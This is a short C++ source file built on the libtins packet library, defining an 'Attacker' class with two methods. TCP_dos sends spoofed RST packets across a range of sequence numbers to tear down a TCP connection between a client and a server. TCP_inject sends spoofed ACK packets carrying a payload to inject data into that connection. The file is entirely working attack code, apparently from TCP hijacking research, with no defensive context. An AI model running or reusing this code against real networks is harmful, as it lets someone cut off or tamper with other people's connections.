#include "Attacker.h"
#include <iostream>
#include <tins/tins.h>

using namespace Tins;

void Attacker::TCP_dos() {
    std::cout << "^.^.^ Reset TCP connection ^.^.^" << std::endl;

    PacketSender sender;
    /* Increased success rate */
    for (uint32_t i = 0; i < seq_window_size; ++i) {
        uint32_t seq = seq_in_window - i;

        IP packet = IP(server_ip, client_ip) / TCP(server_port, client_port);
        TCP &tcp = packet.rfind_pdu<TCP>();
        tcp.set_flag(TCP::RST, true);
        tcp.seq(seq);

        sender.send(packet, send_if_name);
    }
}

void Attacker::TCP_inject() {
    std::cout << "^.^.^ Inject data into TCP connection ^.^.^" << std::endl;

    PacketSender sender;
    std::string payload = " "; // Adjust payload as needed
    
    for (uint32_t i = 0; i < seq_window_size; ++i) {
        uint32_t seq = seq_in_window - i;

        IP packet = IP(client_ip, server_ip) / TCP(client_port, server_port) / RawPDU(payload);
        TCP &tcp = packet.rfind_pdu<TCP>();
        tcp.set_flag(TCP::ACK, true);
        tcp.seq(seq);
        tcp.ack_seq(ack_in_window);

        sender.send(packet, send_if_name);
    }
}
